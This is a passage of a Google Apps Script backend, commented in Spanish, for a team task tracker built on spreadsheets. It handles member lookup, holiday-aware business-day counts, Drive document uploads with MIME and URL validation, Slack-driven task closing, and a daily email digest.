      entries.push({code:team.code,name:mem[j],norm:mn,tokens:mn.split(' ').filter(Boolean),isLeader:false,email:emails[j]||'',order:entries.length});
    }
  }
  var idx = {entries:entries};
  _EQUIPOS_INDEX_CACHE = {ref:eq, idx:idx};
  return idx;
}
// Busca el entry que corresponde a `name` aplicando: (1) match exacto normalizado,
// (2) match por tokens (todos los tokens del query ⊂ tokens del candidato).
// Desempate: exacto > nombre más corto (menos tokens) > primer orden de aparición.
function _findMemberEntry(name, eq){
  if(!name) return null;
  var idx = _buildEquiposIndex(eq);
  var qNorm = _normalizeName(name);
  if(!qNorm) return null;
  var entries = idx.entries;
  // 1) Exacto normalizado
  for(var i=0;i<entries.length;i++){
    if(entries[i].norm === qNorm) return entries[i];
  }
  // 2) Match por tokens
  var qTokens = qNorm.split(' ').filter(Boolean);
  if(!qTokens.length) return null;
  var best = null;
  for(var k=0;k<entries.length;k++){
    var e = entries[k];
    var et = e.tokens; if(!et.length) continue;
    var allIn = true;
    for(var t=0;t<qTokens.length;t++){
      if(et.indexOf(qTokens[t])<0){ allIn = false; break; }
    }
    if(!allIn) continue;
    if(!best){ best = e; continue; }
    // Preferir nombre más corto (menos tokens); empate → primero en el sheet (ya está por order).
    if(e.tokens.length < best.tokens.length) best = e;
  }
  return best;
}
function getCountryForMember(name,eq){
  var hit = _findMemberEntry(name, eq);
  return hit ? hit.code : '';
}
// Resuelve un miembro/líder por nombre con normalización tolerante.
// Devuelve {name, code, email, isLeader} o null. Útil para resolver email al notificar.
function getMemberByName(name, eq){
  var hit = _findMemberEntry(name, eq);
  if(!hit) return null;
  return {name:hit.name, code:hit.code, email:hit.email||'', isLeader:!!hit.isLeader};
}
function getLeaderForCountry(code,eq){for(var i=0;i<eq.length;i++){if(eq[i].code===code)return eq[i].leader}return ''}
function readConfig(ss){var ws=ss.getSheetByName(SHEET_CONFIG);if(!ws)return {};var lr=ws.getLastRow();if(lr<3)return {};var data=ws.getRange(3,1,lr-2,2).getValues(),c={};data.forEach(function(r){if(r[0])c[r[0]]=r[1]});return c}

// ── TEMPLATES ───────────────────────────────────────────────────
// Hoja opcional 'Templates' con columnas: tipoTrabajo | checklist (JSON array).
// readTemplates(ss) → { tipoTrabajo: ['item1', ...] }. Si la hoja no existe o
// está vacía retorna {} (no error). Filas con JSON inválido se loggean y se
// saltan. Backwards-compat: si la hoja no existe, la app sigue funcionando.
function readTemplates(ss) {
  var ws = ss.getSheetByName(SHEET_TEMPLATES);
  if (!ws) return {};
  var lr = ws.getLastRow();
  if (lr < 2) return {};
  var data = ws.getRange(2, 1, lr - 1, 2).getValues();
  var out = {};
  data.forEach(function(r) {
    var tipo = (r[0] || '').toString().trim();
    var raw  = (r[1] || '').toString().trim();
    if (!tipo || !raw) return;
    try {
      var arr = JSON.parse(raw);
      if (Array.isArray(arr)) {
        out[tipo] = arr.map(function(s){ return String(s); }).filter(Boolean);
      } else {
        Logger.log('readTemplates: fila con checklist no-array para tipo "' + tipo + '"; se omite.');
      }
    } catch (e) {
      Logger.log('readTemplates: JSON inválido para tipo "' + tipo + '": ' + ((e && e.message) || e));
    }
  });
  return out;
}

// Entry-point expuesto al frontend vía google.script.run. Cachea 1h bajo
// 'templates_v1' (igual patrón que las otras caches: read-through + serialize).
function getTemplates() {
  return _telemetry('getTemplates', _getTemplatesImpl);
}
function _getTemplatesImpl() {
  var cacheKey = 'templates_v1';
  try {
    var cached = CacheService.getScriptCache().get(cacheKey);
    if (cached) return JSON.parse(cached);
  } catch (e) {}
  var ss = SpreadsheetApp.openById(SHEET_ID);
  var dict = readTemplates(ss);
  try { CacheService.getScriptCache().put(cacheKey, JSON.stringify(dict), 3600); } catch (e) {}
  return dict;
}
// O(1) en lugar del while-day-by-day. Para historial extenso (años),
// el loop original disparaba miles de iteraciones por entry × cientos
// de entries → segundos de CPU. Algoritmo: total días entre fechas,
// menos los fines de semana caídos en ese rango.
// countBizDays(start, end [, feriadosSet]) → cuenta días hábiles estrictamente
// entre start (exclusivo) y end (inclusivo). Excluye sábados y domingos.
// Si se pasa feriadosSet (Set<'YYYY-MM-DD'> o {iso: true}), también excluye
// esos días cuando caen en (start, end] y son días de semana.
// El algoritmo base es O(1) (weeks*5 + remainder); la sustracción de feriados
// es O(|feriadosSet|), típicamente ~18 fechas por país.
function countBizDays(start, end, feriadosSet) {
  if (!start || !end) return 0;
  var s = new Date(start.getFullYear(), start.getMonth(), start.getDate());
  var e = new Date(end.getFullYear(), end.getMonth(), end.getDate());
  var days = Math.round((e - s) / 86400000);
  if (days <= 0) return 0;
  var weeks = Math.floor(days / 7);
  var biz = weeks * 5;
  var startDow = s.getDay();
  // Para los días sobrantes (0..6), contar cuáles caen en lun-vie.
  var rem = days - weeks * 7;
  for (var i = 1; i <= rem; i++) {
    var dow = (startDow + i) % 7;
    if (dow !== 0 && dow !== 6) biz++;
  }
  // Restar feriados de día de semana que caigan en (s, e].
  if (feriadosSet && _setHas(feriadosSet)) {
    _forEachFeriado(feriadosSet, function(iso){
      var m = iso.match(/^(\d{4})-(\d{2})-(\d{2})$/);
      if (!m) return;
      var f = new Date(parseInt(m[1],10), parseInt(m[2],10)-1, parseInt(m[3],10));
      if (f.getTime() > s.getTime() && f.getTime() <= e.getTime()) {
        var dow2 = f.getDay();
        if (dow2 !== 0 && dow2 !== 6) biz--;
      }
    });
  }
  return biz < 0 ? 0 : biz;
}

// Helper portable: ¿el "set" tiene al menos un elemento? Aceptamos Set nativo o plain object.
function _setHas(setOrObj) {
  if (!setOrObj) return false;
  if (typeof setOrObj.size === 'number') return setOrObj.size > 0;
  for (var k in setOrObj) { if (setOrObj.hasOwnProperty(k)) return true; }
  return false;
}
function _forEachFeriado(setOrObj, cb) {
  if (!setOrObj) return;
  if (typeof setOrObj.forEach === 'function' && typeof setOrObj.size === 'number') {
    setOrObj.forEach(function(v){ cb(v); });
  } else {
    for (var k in setOrObj) { if (setOrObj.hasOwnProperty(k)) cb(k); }
  }
}

// Diferencia en días hábiles entre dos ISO dates, con signo. Negativo si el
// deadline ya pasó. Usa los feriados del país pasado; si paisCode no está en
// feriadosByCountry, fallback a "solo lun-vie sin feriados".
//
// Ejemplo: today=Vie 2026-05-15, deadline=Lun 2026-05-18 → 1
// (calendar daría 3; con biz days solo cuenta el lunes).
function _bizDaysBetween(todayISO, deadlineISO, paisCode, feriadosByCountry) {
  if (!todayISO || !deadlineISO) return 0;
  var today = _parseISODate(todayISO);
  var deadline = _parseISODate(deadlineISO);
  if (!today || !deadline) return 0;
  var set = (feriadosByCountry && paisCode && feriadosByCountry[paisCode]) || null;
  var t = today.getTime(), d = deadline.getTime();
  if (d > t) return  countBizDays(today, deadline, set);
  if (d < t) return -countBizDays(deadline, today, set);
  return 0;
}

// _loadFeriados(ss) → { CO: Set('YYYY-MM-DD'), MX: Set, CR: Set, ... }
// Lee la hoja 'Feriados' (cols: pais | fecha | nombre). Cacheado 1h en
// CacheService bajo 'feriados_v1'. Si la hoja no existe, retorna {}.
function _loadFeriados(ss) {
  try {
    var cache = CacheService.getScriptCache();
    var cached = cache.get('feriados_v1');
    if (cached) {
      var obj = JSON.parse(cached);
      // Rehidratar a Sets para mantener la API estable downstream.
      var out = {};
      Object.keys(obj).forEach(function(code){
        var s = new Set();
        (obj[code] || []).forEach(function(iso){ s.add(iso); });
        out[code] = s;
      });
      return out;
    }
  } catch(e) { /* cache falló — recomputamos */ }

  var result = {};
  try {
    var ws = ss.getSheetByName(SHEET_FERIADOS);
    if (!ws) return result;
    var lr = ws.getLastRow();
    if (lr < 2) return result;
    var data = ws.getRange(2, 1, lr - 1, 3).getValues();
    data.forEach(function(row){
      var pais = (row[0] || '').toString().trim().toUpperCase();
      if (!pais) return;
      var raw = row[1];
      var iso = '';
      if (raw instanceof Date) {
        iso = Utilities.formatDate(raw, 'America/Bogota', 'yyyy-MM-dd');
      } else {
        var m = (raw || '').toString().trim().match(/^(\d{4})-(\d{2})-(\d{2})/);
        if (m) iso = m[1] + '-' + m[2] + '-' + m[3];
      }
      if (!iso) return;
      if (!result[pais]) result[pais] = new Set();
      result[pais].add(iso);
    });
  } catch(e) {
    Logger.log('[feriados] read failed: ' + e.message);
    return {};
  }

  // Cachear: serializamos Sets a arrays de strings para JSON.
  try {
    var serial = {};
    Object.keys(result).forEach(function(code){
      serial[code] = [];
      result[code].forEach(function(iso){ serial[code].push(iso); });
    });
    CacheService.getScriptCache().put('feriados_v1', JSON.stringify(serial), 3600);
  } catch(e) { /* cache write falló — no es crítico */ }

  return result;
}
// Mueve una tarea al Historial preservando su ID original.
// Ya NO renumera las tareas restantes: los IDs son persistentes (pueden quedar huecos 1,3,7,...).
// Lock para que read+append+delete sean atómicos: sin lock, dos cierres concurrentes pueden
// borrar filas incorrectas (el deleteRow corre contra el sheet ya mutado por otro usuario).
function moveToHistorial(ss, wsA, row) {
  var lock = LockService.getScriptLock();
  try { lock.waitLock(10000); } catch(e) { throw new Error('Servidor ocupado, reintenta en un momento.'); }
  try {
    var wsH = ss.getSheetByName(SHEET_HISTORIAL);
    var lc = Math.min(wsA.getLastColumn(), TASK_COLS);
    var rd = wsA.getRange(row, 1, 1, lc).getValues()[0];
    while (rd.length < TASK_COLS) rd.push('');
    // Preserva el ID original — NO reasignar. Así las referencias (notas, Slack, humanas) siguen válidas.
    wsH.appendRow(rd);
    wsA.deleteRow(row);
  } finally {
    lock.releaseLock();
  }
}

// Calcula el próximo ID único entre activos + historial (evita colisiones tras mover tareas).
function nextTaskId(ss) {
  var maxId = 0;
  ['Tracking Activo','Historial'].forEach(function(name){
    var ws = ss.getSheetByName(name); if (!ws) return;
    var lr = ws.getLastRow(); if (lr < 4) return;
    var ids = ws.getRange(4, 1, lr - 3, 1).getValues();
    ids.forEach(function(r){ var v = parseInt(r[0], 10); if (!isNaN(v) && v > maxId) maxId = v; });
  });
  return maxId + 1;
}
function getCurrentWeekLabel(){var now=new Date(),mon=new Date(now);mon.setDate(now.getDate()-(now.getDay()===0?6:now.getDay()-1));var fri=new Date(mon);fri.setDate(mon.getDate()+4);var m=['ene','feb','mar','abr','may','jun','jul','ago','sep','oct','nov','dic'];return mon.getDate()+'-'+fri.getDate()+' '+m[fri.getMonth()]+' '+fri.getFullYear()}

// ════════════════════════════════════════════════════════════════
// DOCUMENTS (Drive integration)
// ════════════════════════════════════════════════════════════════
// Cada task/project tiene columna "Documentos" con JSON [{name, url, id}].
// Subidas nuevas se clasifican en subcarpetas automáticas bajo la raíz
// configurada en Config!DriveFolder.

function _parseDocs(cellValue) {
  if (!cellValue) return [];
  var s = cellValue.toString().trim();
  if (!s) return [];
  try {
    var arr = JSON.parse(s);
    return Array.isArray(arr) ? arr : [];
  } catch (e) { return []; }
}

function _serializeDocs(docs) {
  if (!docs || !docs.length) return '';
  return JSON.stringify(docs);
}

// Extrae el ID de Drive de una URL o retorna el valor tal cual si ya parece ID.
function _extractDriveId(urlOrId) {
  if (!urlOrId) return '';
  var s = urlOrId.toString().trim();
  // URL típica: /folders/XXX  o  /d/XXX  o  ?id=XXX
  var m = s.match(/\/folders\/([a-zA-Z0-9_-]+)/) ||
          s.match(/\/d\/([a-zA-Z0-9_-]+)/) ||
          s.match(/[?&]id=([a-zA-Z0-9_-]+)/);
  if (m) return m[1];
  // Si ya parece un ID crudo (solo chars válidos)
  if (/^[a-zA-Z0-9_-]{20,}$/.test(s)) return s;
  return '';
}

// Resuelve la carpeta raíz configurada en Config!DriveFolder. Lanza si no
// está configurada o no es accesible. Los mensajes de error apuntan al admin
// (primer email en Config!Heads) cuando es posible — así el usuario sabe
// a quién pedirle que arregle la config en lugar de quedar trabado.
function _getRootFolder() {
  var ss = SpreadsheetApp.openById(SHEET_ID);
  var config = readConfig(ss);
  var cfgValue = config['DriveFolder'] || config['driveFolder'] || '';
  if (!cfgValue) {
    // Tomamos el primer email de Heads como contacto para el usuario.
    // Si no hay Heads configurados, mensaje genérico (sigue siendo accionable).
    var headsRaw = (config['Heads'] || '').toString();
    var firstHead = headsRaw.split(',').map(function(s){ return s.trim(); }).filter(Boolean)[0] || '';
    if (firstHead) {
      throw new Error('Pedile a ' + firstHead + ' que configure Config!DriveFolder con la URL de la carpeta de Drive raíz.');
    }
    throw new Error('Falta configurar Config!DriveFolder: pega la URL o el ID de la carpeta de Drive raíz en la hoja Config.');
  }
  var folderId = _extractDriveId(cfgValue);
  if (!folderId) {
    // Truncamos el valor recibido para no inflar el error con strings largos
    // (la URL o el ID típicos no superan 80 chars; valores raros se ven igual).
    var preview = cfgValue.toString();
    if (preview.length > 80) preview = preview.substring(0, 80) + '...';
    throw new Error("El valor de Config!DriveFolder no parece una URL de Drive ni un ID. Recibido: '" + preview + "'.");
  }
  try {
    return DriveApp.getFolderById(folderId);
  } catch (e) {
    // Caso típico: el usuario perdió el scope de Drive (reautorización pendiente)
    // o el dueño del webapp no aprobó el scope. Mensaje accionable en lugar de raw.
    throw new Error('No tengo permiso para acceder a la carpeta de Drive. Pedile al dueño del script que apruebe los permisos.');
  }
}

// Retorna (o crea) una subcarpeta por nombre dentro de parent.
function _ensureSubfolder(parent, name) {
  var clean = (name || '').toString().trim() || 'Sin clasificar';
  var it = parent.getFoldersByName(clean);
  if (it.hasNext()) return it.next();
  return parent.createFolder(clean);
}

// Resuelve la carpeta final donde debe ir un archivo según la taxonomía:
//   TipoTrabajo / País / (NombreProyecto | "Tareas sueltas")
function _resolveTargetFolder(kind, itemId) {
  var ss = SpreadsheetApp.openById(SHEET_ID);
  var root = _getRootFolder();
  var tipo = '', pais = '', projName = '';

  if (kind === 'task') {
    var ws = ss.getSheetByName(SHEET_ACTIVO);
    var lr = ws.getLastRow();
    var lc = Math.min(ws.getLastColumn(), TASK_COLS);
    var data = ws.getRange(4, 1, Math.max(0, lr - 3), lc).getValues();
    for (var i = 0; i < data.length; i++) {
      if (data[i][0] == itemId) {
        pais = (data[i][12] || '').toString().trim();
        tipo = (data[i][14] || '').toString().trim();
        var pid = parseInt((data[i][11] || '').toString().trim(), 10);
        if (!isNaN(pid)) {
          var projRow = _readProjectById(ss, pid);
          if (projRow) {
            var pws = ss.getSheetByName(SHEET_PROYECTOS);
            projName = (pws.getRange(projRow.row, 2).getValue() || '').toString().trim();
          }
        }
        break;
      }
    }
  } else if (kind === 'project') {
    var pws = ss.getSheetByName(SHEET_PROYECTOS);
    var plr = pws.getLastRow();
    var pdata = pws.getRange(2, 1, Math.max(0, plr - 1), PROJ_COLS).getValues();
    for (var j = 0; j < pdata.length; j++) {
      if (pdata[j][0] == itemId) {
        pais = (pdata[j][2] || '').toString().trim();
        tipo = (pdata[j][13] || '').toString().trim();
        projName = (pdata[j][1] || '').toString().trim();
        break;
      }
    }
  }

  var tipoFolder = _ensureSubfolder(root, tipo || 'Sin clasificar');
  var paisFolder = _ensureSubfolder(tipoFolder, pais || 'Sin país');
  var finalName = kind === 'project'
    ? (projName || 'Sin nombre')
    : (projName || 'Tareas sueltas');
  return _ensureSubfolder(paisFolder, finalName);
}

// Lee los docs actuales del item + la posición en el sheet + la columna.
function _readDocsFor(kind, itemId) {
  var ss = SpreadsheetApp.openById(SHEET_ID);
  if (kind === 'task') {
    var ws = ss.getSheetByName(SHEET_ACTIVO);
    var lr = ws.getLastRow();
    if (lr < 4) return null;
    var lc = Math.min(ws.getLastColumn(), TASK_COLS);
    var data = ws.getRange(4, 1, lr - 3, lc).getValues();
    for (var i = 0; i < data.length; i++) {
      if (data[i][0] == itemId) {
        return { ss: ss, ws: ws, row: i + 4, col: TASK_DOCS_COL, docs: _parseDocs(data[i][TASK_DOCS_COL - 1]),
                 target: { resp: data[i][2], pais: (data[i][12] || '').toString().trim() } };
      }
    }
  } else if (kind === 'project') {
    var pws = ss.getSheetByName(SHEET_PROYECTOS);
    var plr = pws.getLastRow();
    if (plr < 2) return null;
    var pdata = pws.getRange(2, 1, plr - 1, PROJ_COLS).getValues();
    for (var j = 0; j < pdata.length; j++) {
      if (pdata[j][0] == itemId) {
        var parts = (pdata[j][12] || '').toString().split(',').map(function(s){ return s.trim(); }).filter(Boolean);
        return { ss: ss, ws: pws, row: j + 2, col: PROJ_DOCS_COL, docs: _parseDocs(pdata[j][PROJ_DOCS_COL - 1]),
                 target: { responsable: (pdata[j][4] || '').toString().trim(),
                           pais: (pdata[j][2] || '').toString().trim(),
                           participantes: parts } };
      }
    }
  }
  return null;
}

// Sube un archivo (base64) a Drive y lo vincula al item. Retorna el doc descriptor.
// SECURITY: aplica cap de tamaño y allowlist de MIME types para evitar abuso.
var _UPLOAD_MAX_BYTES = 45 * 1024 * 1024; // 45 MB
var _UPLOAD_ALLOWED_MIME = {
  'application/pdf': 1,
  'application/msword': 1,
  'application/vnd.openxmlformats-officedocument.wordprocessingml.document': 1,
  'application/vnd.ms-excel': 1,
  'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet': 1,
  'image/png': 1,
  'image/jpeg': 1,
  'image/jpg': 1,
  'text/plain': 1
};
// Wrapper público: garantiza que cualquier excepción (Drive cuota, permisos,
// scope no autorizado) llegue al cliente como {success:false, error} y NO
// rompa el failureHandler del frontend.
function uploadDocument(kind, itemId, fileData) {
  return _safeMutation(function() { return _uploadDocumentImpl(kind, itemId, fileData); });
}
function _uploadDocumentImpl(kind, itemId, fileData) {
  if (!fileData || !fileData.data || !fileData.name) {
    return { success: false, error: 'Datos de archivo inválidos' };
  }
  var ctx = _getAuthContext();
  var info = _readDocsFor(kind, itemId);
  if (!info) return { success: false, error: (kind === 'project' ? 'Proyecto' : 'Tarea') + ' #' + itemId + ' no encontrado' };
  if (kind === 'task') _authorizeTaskWrite(ctx, info.target);
  else _authorizeProjectWrite(ctx, info.target);

  // Validar MIME en allowlist (rechaza tipos peligrosos: html, exe, scripts, etc.)
  var mime = (fileData.mimeType || '').toString().trim().toLowerCase();
  if (!_UPLOAD_ALLOWED_MIME[mime]) {
    return { success: false, error: 'Tipo de archivo no permitido' };
  }

  var folder;
  try {
    folder = _resolveTargetFolder(kind, itemId);
  } catch (e) {
    return { success: false, error: e.message };
  }

  var bytes = Utilities.base64Decode(fileData.data);
  // Cap de tamaño para evitar agotar cuota de Drive del owner del webapp.
  if (bytes.length > _UPLOAD_MAX_BYTES) {
    return { success: false, error: 'Archivo demasiado grande (máx. 45 MB)' };
  }
  var blob = Utilities.newBlob(bytes, mime, fileData.name);
  var file = folder.createFile(blob);

  var doc = { name: file.getName(), url: file.getUrl(), id: file.getId(),
              uploadedBy: ctx.user.name, uploadedAt: new Date().toISOString() };
  var docs = info.docs.concat([doc]);
  info.ws.getRange(info.row, info.col).setValue(_serializeDocs(docs));
  // invalidateCache() lo dispara _safeMutation; no llamar acá (doble call).
  return { success: true, doc: doc };
}

// Vincula un link existente de Drive (no mueve el archivo).
function attachDocumentLink(kind, itemId, link) {
  return _safeMutation(function() { return _attachDocumentLinkImpl(kind, itemId, link); });
}
function _attachDocumentLinkImpl(kind, itemId, link) {
  if (!link || !link.url) return { success: false, error: 'URL requerida' };
  var url = link.url.toString().trim();
  // Validar esquema: solo http(s). Esto bloquea javascript:, data:, file:, etc.
  // que podrían ser usados como vector XSS persistente al renderear el link.
  if (!/^https?:\/\//i.test(url)) {
    return { success: false, error: 'URL inválida: solo se aceptan https:// o http://' };
  }
  // Validar largo razonable (evita DoS por strings gigantes en la celda)
  if (url.length > 2048) {
    return { success: false, error: 'URL demasiado larga (máx. 2048 caracteres)' };
  }
  // Bloquear caracteres de control que podrían romper el render del atributo HTML
  if (/[ -]/.test(url)) {
    return { success: false, error: 'URL contiene caracteres inválidos' };
  }
  var ctx = _getAuthContext();
  var info = _readDocsFor(kind, itemId);
  if (!info) return { success: false, error: (kind === 'project' ? 'Proyecto' : 'Tarea') + ' #' + itemId + ' no encontrado' };
  if (kind === 'task') _authorizeTaskWrite(ctx, info.target);
  else _authorizeProjectWrite(ctx, info.target);

  var doc = {
    name: (link.name || '').toString().trim() || url,
    url: url,
    id: _extractDriveId(url) || '',
    external: true,
    uploadedBy: ctx.user.name,
    uploadedAt: new Date().toISOString()
  };
  var docs = info.docs.concat([doc]);
  info.ws.getRange(info.row, info.col).setValue(_serializeDocs(docs));
  // invalidateCache() lo dispara _safeMutation; no llamar acá (doble call).
  return { success: true, doc: doc };
}

// Quita la referencia del tracker (NO borra el archivo en Drive).
function removeDocument(kind, itemId, docIndex) {
  return _safeMutation(function() { return _removeDocumentImpl(kind, itemId, docIndex); });
}
function _removeDocumentImpl(kind, itemId, docIndex) {
  var ctx = _getAuthContext();
  var info = _readDocsFor(kind, itemId);
  if (!info) return { success: false, error: 'No encontrado' };
  if (kind === 'task') _authorizeTaskWrite(ctx, info.target);
  else _authorizeProjectWrite(ctx, info.target);

  var idx = parseInt(docIndex, 10);
  if (isNaN(idx) || idx < 0 || idx >= info.docs.length) return { success: false, error: 'Índice inválido' };
  info.docs.splice(idx, 1);
  info.ws.getRange(info.row, info.col).setValue(_serializeDocs(info.docs));
  // invalidateCache() lo dispara _safeMutation; no llamar acá (doble call).
  return { success: true };
}

// ════════════════════════════════════════════════════════════════
// SLACK HELPERS
// ════════════════════════════════════════════════════════════════
// ── Busca candidatos por fuzzy match. Retorna top 3 ordenados por score.
// Cada candidato: {id, nombre, row, score, ratio, confidence: 'high'|'low'|'none'}
// high: ≥3 matches y ratio ≥0.5   low: ≥1 match   none: sin coincidencia útil
// Aunque es un read-only, lo envolvemos en _safeMutation para que un sheet
// lockup u otro error transitorio se propague al frontend como
// {success:false, error} y caiga en los failureHandlers existentes.
function findTaskCandidates(text) {
  return _safeMutation(function() { return _findTaskCandidatesImpl(text); });
}
function _findTaskCandidatesImpl(text) {
  var ss = SpreadsheetApp.openById(SHEET_ID), ws = ss.getSheetByName(SHEET_ACTIVO);
  var lr = ws.getLastRow();
  if (lr < 4) return {candidates: [], confidence: 'none'};
  var lc = Math.min(ws.getLastColumn(), TASK_COLS);
  var data = ws.getRange(4, 1, lr - 3, lc).getValues();
  var st = (text || '').toLowerCase();
  var words = st.split(/\s+/).filter(function(w){return w.length > 2});
  if (words.length === 0) return {candidates: [], confidence: 'none'};

  var scored = [];
  for (var i = 0; i < data.length; i++) {
    var n = (data[i][1] || '').toLowerCase(); if (!n) continue;
    var nameWords = n.split(/\s+/).filter(function(w){return w.length > 2});
    if (nameWords.length === 0) continue;
    var sc = 0;
    words.forEach(function(x){ if (n.indexOf(x) >= 0) sc++; });
    if (sc === 0) continue;
    // ratio: matches / (palabras relevantes del nombre) — penaliza matches triviales en nombres largos
    var ratio = sc / Math.max(nameWords.length, 1);
    scored.push({id: data[i][0], nombre: data[i][1], row: i + 4, score: sc, ratio: ratio});
  }
  scored.sort(function(a, b){ return (b.score - a.score) || (b.ratio - a.ratio); });
  var top = scored.slice(0, 3);
  var confidence = 'none';
  if (top.length > 0) {
    var best = top[0];
    if (best.score >= 3 && best.ratio >= 0.5) confidence = 'high';
    else if (best.score >= 1) confidence = 'low';
  }
  return {candidates: top, confidence: confidence};
}

// Cierra una tarea por ID (desde Slack o tras confirmación). Valida permiso:
// desde Slack, Session=owner (head) así que pasa; desde el webapp, el usuario
// debe tener permiso sobre la tarea según su rol.
function closeTaskById(taskId, slackUser) {
  return _telemetry('closeTaskById', function() {
    return _closeTaskByIdImpl(taskId, slackUser);
  }, { taskId: taskId, viaSlack: !!slackUser });
}
function _closeTaskByIdImpl(taskId, slackUser) {
  var ctx = _getAuthContext();
  var current = _readTaskById(ctx.ss, taskId);
  if (!current) return { success: false, message: 'Tarea #' + taskId + ' no encontrada' };
  _authorizeTaskWrite(ctx, current);

  var ws = ctx.ss.getSheetByName(SHEET_ACTIVO);
  // Lock para serializar la mutación. moveToHistorial se llama fuera (tiene su
  // propio lock interno; no asumimos reentrancia del lock de Apps Script).
  var lock = LockService.getScriptLock();
  try { lock.waitLock(10000); } catch(e) { throw new Error('Servidor ocupado, reintenta en un momento.'); }
  var tn;
  try {
    tn = ws.getRange(current.row, 2).getValue();
    ws.getRange(current.row, 7).setValue('Listo');
    ws.getRange(current.row, 10).setValue(new Date());
  } finally {
    lock.releaseLock();
  }
  moveToHistorial(ctx.ss, ws, current.row);
  invalidateCache();
  return { success: true, id: taskId, nombre: tn, message: 'Tarea #' + taskId + ' "' + tn + '" cerrada y movida a Historial' };
}

// Bloquea una tarea por ID. Mismas validaciones que closeTaskById.
function blockTaskById(taskId, reason, slackUser) {
  return _telemetry('blockTaskById', function() {
    return _blockTaskByIdImpl(taskId, reason, slackUser);
  }, { taskId: taskId, viaSlack: !!slackUser, hasReason: !!reason });
}
function _blockTaskByIdImpl(taskId, reason, slackUser) {
  var ctx = _getAuthContext();
  var current = _readTaskById(ctx.ss, taskId);
  if (!current) return { success: false, message: 'Tarea #' + taskId + ' no encontrada' };
  _authorizeTaskWrite(ctx, current);

  var ws = ctx.ss.getSheetByName(SHEET_ACTIVO);
  // Lock para serializar el read-modify-write de notas (evita perder concurrencia).
  var lock = LockService.getScriptLock();
  try { lock.waitLock(10000); } catch(e) { throw new Error('Servidor ocupado, reintenta en un momento.'); }
  try {
    var tn = ws.getRange(current.row, 2).getValue();
    ws.getRange(current.row, 7).setValue('Bloqueado');
    var prevNotes = ws.getRange(current.row, 11).getValue() || '';
    var stamp = '⛔ ' + (reason || '') + ' (' + (slackUser || '') + ', ' + new Date().toLocaleDateString('es-CO') + ')';
    ws.getRange(current.row, 11).setValue(_sanitizeCell((prevNotes ? prevNotes + ' | ' : '') + stamp));
    return { success: true, id: taskId, nombre: tn, message: 'Tarea bloqueada: #' + taskId + ' "' + tn + '"' };
  } finally {
    lock.releaseLock();
    invalidateCache();
  }
}
// ════════════════════════════════════════════════════════════════
// DAILY DIGEST · trigger time-driven 8am Bogotá
// ════════════════════════════════════════════════════════════════
// Entry point del trigger: sendDailyDigest(). Configurar manualmente
// en el editor (Triggers → +Add → function: sendDailyDigest →
// Time-driven → Day timer → 8am-9am → Save). El trigger autoriza
// scopes de MailApp y SpreadsheetApp en la primera corrida.
//
// Para QA sin spamear al equipo: _sendDailyDigestPreview('tu@email.com')
// redirige TODOS los emails (specialist + manager) a ese destinatario.
// Cada email incluye un banner indicando para quién era originalmente.
//
// Reglas de scope:
//   - Solo specialist con tareas etaDays <= 2 (vencidas + hoy + 48h)
//   - Specialist ve todas sus tareas (incluyendo confidenciales)
//   - Manager ve resumen agregado del equipo (sin nombres de tareas,
//     por confidencialidad). Solo conteos + top-3 personas con overdue.
//   - Skip fines de semana (config: DIGEST_SKIP_WEEKENDS).
//   - Si no hay email para una persona en Equipos → Logger.log y skip,
//     no falla el trigger entero.

function sendDailyDigest() {
  return _runDailyDigest(null);
}

function _sendDailyDigestPreview(emailDestino) {
  if (!emailDestino) throw new Error('emailDestino requerido. Uso: _sendDailyDigestPreview("tu@email.com")');
  return _runDailyDigest(emailDestino);
}

function _runDailyDigest(forcedEmail) {
  var isPreview = !!forcedEmail;
  try {
    // Skip fines de semana (excepto en preview, donde queremos testear cualquier día)
    if (!isPreview && DIGEST_SKIP_WEEKENDS) {
      var dow = new Date().getDay(); // 0=dom, 6=sab
      if (dow === 0 || dow === 6) {
        Logger.log('[digest] skip — fin de semana (dow=' + dow + ')');
        return { sent: 0, skipped: 0, reason: 'weekend' };
      }
    }

    var ss = SpreadsheetApp.openById(SHEET_ID);
    var equipos = readEquipos(ss);
    var fbc = _loadFeriados(ss);
    var ws = ss.getSheetByName(SHEET_ACTIVO);
    var tasks = readTasks(ws);
    var todayISO = Utilities.formatDate(new Date(), DIGEST_TZ, 'yyyy-MM-dd');
    tasks.forEach(function(t){ _enrichTaskEditorial(t, todayISO, { feriadosByCountry: fbc }); });

    // Relevantes: no Listo, con etaDays, y vencidas / hoy / 1-2 días
    var relevant = tasks.filter(function(t){
      return t.status !== 'Listo' &&
             typeof t.etaDays === 'number' &&
             t.etaDays <= 2;
    });

    // Agrupar por responsable
    var byResp = {};
    relevant.forEach(function(t){
      var name = (t.resp||'').trim();
      if (!name) return;
      if (!byResp[name]) byResp[name] = { overdue: [], today: [], soon: [] };
      if (t.etaDays < 0) byResp[name].overdue.push(t);
      else if (t.etaDays === 0) byResp[name].today.push(t);
      else byResp[name].soon.push(t);
    });

    // Specialist digest
    var sent = 0, skipped = 0;
    Object.keys(byResp).forEach(function(name){
      var entry = _findMemberEntry(name, equipos);
      var email = entry && entry.email ? entry.email : '';
      if (!email) {
        Logger.log('[digest] no email for "' + name + '" — skipping');
        skipped++;
        return;
      }
      var target = isPreview ? forcedEmail : email;
      try {
        _sendSpecialistDigest(target, name, byResp[name], isPreview ? email : null);
        sent++;
      } catch (mailErr) {
        Logger.log('[digest] mail failed for ' + name + ' (' + email + '): ' + mailErr.message);
        skipped++;
      }
    });

    // Manager digest (uno por team con leaderEmail y al menos 1 tarea relevante)
    var managerSent = 0;
    equipos.forEach(function(team){
      if (!team.leaderEmail) return;
      var teamNames = (team.members||[]).slice();
      if (team.leader) teamNames.push(team.leader);
      var teamNamesNorm = {};
      teamNames.forEach(function(n){ teamNamesNorm[_normalizeName(n)] = n; });
      var teamRelevant = relevant.filter(function(t){
        return teamNamesNorm.hasOwnProperty(_normalizeName(t.resp));
      });
      if (teamRelevant.length === 0) return;
      var target = isPreview ? forcedEmail : team.leaderEmail;
      try {
        _sendManagerDigest(target, team, teamRelevant, isPreview ? team.leaderEmail : null);
        managerSent++;
      } catch (mailErr) {
        Logger.log('[digest] manager mail failed for ' + team.code + ' (' + team.leaderEmail + '): ' + mailErr.message);
      }
    });

    var summary = { sent: sent, skipped: skipped, managerSent: managerSent, preview: isPreview ? forcedEmail : null };
    Logger.log('[digest] ' + JSON.stringify(summary) + ' · quota remaining: ' + MailApp.getRemainingDailyQuota());
    return summary;
  } catch (e) {
